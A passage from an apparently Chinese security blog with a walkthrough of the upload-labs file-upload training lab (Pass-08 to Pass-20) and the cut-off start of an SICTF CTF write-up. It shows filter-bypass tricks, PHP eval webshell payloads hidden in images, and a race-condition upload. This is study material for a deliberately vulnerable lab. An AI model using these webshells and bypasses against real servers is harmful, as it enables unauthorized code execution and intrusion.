class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><blockquote><p>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p><p>例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</p></blockquote><p>这关仍是需要在windows下进行,<strong>对应 buu upload-labs windows中的Pass-09</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155606882.png" alt="image-20240220155606882"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155548411.png" alt="image-20240220155548411"></p><h2 id="Pass-09-末尾添加"><a href="#Pass-09-末尾添加" class="headerlink" title="Pass-09(末尾添加. .)"></a>Pass-09(末尾添加. .)</h2><p>虽然删除了末尾的点,但是只会删除一次,只需要构造.php. .即可</p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240220161304719.png" alt="image-20240220161304719"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161250250.png" alt="image-20240220161250250"></p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10(双写绕过)"></a>Pass-10(双写绕过)</h2><p>此关做了一个检测到黑字符并删除一次,只需要构造一个双写即可</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161639031.png" alt="image-20240220161639031"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161708635.png" alt="image-20240220161708635"></p><h2 id="Pass-11-00截断-get"><a href="#Pass-11-00截断-get" class="headerlink" title="Pass-11(%00截断 get)"></a>Pass-11(%00截断 get)</h2><p>此pass在本地测试,所以为全部21关的pass-12</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>可以看见这里上传路径可控, 只需要将上传路径构造成php文件名然后%00截断后面的数据即可</p><blockquote><p>php版本&lt;&#x3D; 5.3.4</p><p>需要设置php的magic_quotes_gpc为OFF状态。</p><p>否则php会将00截断字符进行转义</p></blockquote><p>比较无语的都是这些条件都弄好后还是不行,下一关也是这样 php版本5.3.29nts</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220171518503.png" alt="image-20240220171518503"></p><h2 id="Pass-12-00截断-post"><a href="#Pass-12-00截断-post" class="headerlink" title="Pass-12(%00截断 post)"></a>Pass-12(%00截断 post)</h2><p>此pass在本地测试,所以为全部21关的pass-13</p><p>与上一关不同的是采用post发送路径, %00不会被自动解码,所以要再hex中更改</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172214262.png" alt="image-20240220172214262"></p><p>将这里的2b改为00即可</p><p>这里也没有成功,但方法是这个方法</p><h2 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13(图片马绕过)"></a>Pass-13(图片马绕过)</h2><p>这一关对文件头信息做了检测,并根据文件头对文件后缀名重写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再真的png图片末尾加上php构造图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172823309.png" alt="image-20240220172823309"></p><p>之后利用其他漏洞如文件包含来解析图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220173250962.png" alt="image-20240220173250962"></p><h2 id="Pass-14-图片马绕过"><a href="#Pass-14-图片马绕过" class="headerlink" title="Pass-14(图片马绕过)"></a>Pass-14(图片马绕过)</h2><p>源码不一样,但还是相同的配方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174448027.png" alt="image-20240220174448027"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174459794.png" alt="image-20240220174459794"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>Pass-13,14解法相同</p><h2 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16(二次渲染)"></a>Pass-16(二次渲染)</h2><p>这里参考一篇大佬的博客:</p><p><a href="https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93</a></p><p>这里虽然是第16关, 但在全部21关里是第17关也就是二次渲染</p><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF:"></a>GIF:</h3><p>随便找一张gif图片</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/2.gif" alt="2"></p><p>上传后,将返回的图片下载下来</p><p>在010editor的tools中的compare模块比较两张图片,并找到两张图片相同的部分(Match的灰色部分, 或者点击match后,蓝色的部分)</p><p>之后插入木马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194217773.png" alt="image-20240221194217773"></p><p>这里插入在<code>.......</code>处成功率高一点, 试过几次插在别的地方可能会不成功</p><p>保存后重新上传,包含渲染后的图片</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194322951.png" alt="image-20240221194322951"></p><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG:"></a>PNG:</h3><p>直接使用github中的已有的项目</p><p><a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/poc">https://github.com/hxer/imagecreatefrom-/tree/master/png/poc</a></p><p>可以使用它给出的poc图片或者自己生成一个,这里直接使用给出的poc</p><p>注意 自己生成的话需要python2环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145218462.png" alt="image-20240222145218462"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145208117.png" alt="image-20240222145208117"></p><h3 id="JPG"><a href="#JPG" class="headerlink" title="JPG:"></a>JPG:</h3><p>同意在github找到现成的项目</p><p><a href="https://github.com/BlackFan/jpg_payload">https://github.com/BlackFan/jpg_payload</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222154943666.png" alt="image-20240222154943666"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222155327830.png" alt="image-20240222155327830"></p><p>试了很多次都是这样</p><p>换了一张比较大的图片,上面的问题没了但是插入后的payload并不完整</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160105600.png" alt="image-20240222160105600"></p><p>这里补充: 插入后看不见<code>_</code>并不是<code>_</code>消失了, 在010editor能看见<code>_</code>是存在的</p><p>最后用大佬的这个payload是可以成功插入的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160433105.png" alt="image-20240222160433105"></p><p>但是还会出现提示不是jpg</p><p>这里其实phpinfo插入进去是可以成功的, 别的payload要么回显不是jpg, 要么插入进去后<code>_</code>被删掉了</p><p>最后尝试了无数遍后成功插入进去了<code>&lt;?php @eval($_POST[a]);?&gt;</code>,并且再次渲染后payload依然存在,但是在include后并不能解析,不知道什么问题</p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17(条件竞争)"></a>Pass-17(条件竞争)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见这里是先把文件保存下来再进行判断, 因此可以进行条件竞争</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181755245.png" alt="image-20240222181755245"></p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240222181811015.png" alt="image-20240222181811015"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181820037.png" alt="image-20240222181820037"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这里不能再使用php文件了, 因为服务器会比对后缀名后再决定是否保存,</p><p>这里直接上传图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153402676.png" alt="image-20240223153402676"></p><p>可以用用文件包含来条件竞争我们上传的图片马</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153322537.png" alt="image-20240223153322537"></p><h2 id="Pass-19-move-uploaded-file-特性"><a href="#Pass-19-move-uploaded-file-特性" class="headerlink" title="Pass-19(move_uploaded_file()特性)"></a>Pass-19(move_uploaded_file()特性)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里依然是黑名单绕过, 但是保存的文件名是可控制的</p><p>这里用到一个函数特性:</p><p>move_uploaded_file()会忽略掉文件末尾的 <code>/.</code></p><p>所以构造.php&#x2F;.来绕过黑名单, 经过move_uploaded_file()后又变回了.php</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154404013.png" alt="image-20240223154404013"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154416422.png" alt="image-20240223154416422"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>主要在于这两句:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里只需要传入数组就可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>reset()会返回数组中的第一个值, count()返回数组中的元素个数</p><p>我们只需要使得reset($file)&#x3D;&#x3D;xxx.php; $file[count($file) - 1]&#x3D;&#x3D;空值 就可以构造出一个php文件名</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155819310.png" alt="image-20240223155819310"></p><p>此时数组内有两个元素, 而2-1&#x3D;1 索引为1的元素值为空值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155829766.png" alt="image-20240223155829766"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF-Round-3</title>
      <link href="/2024/02/19/SICTF-Round-3/"/>
      <url>/2024/02/19/SICTF-Round-3/</url>
      
        <content type="html"><![CDATA[<h2 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h2><p>首先构造后缀名.php.</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.life:36177</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------291815788614695660121094840087</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://yuanshen.life:36177</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://yuanshen.life:36177/index.php?file=index.php</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">Upgrade-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span 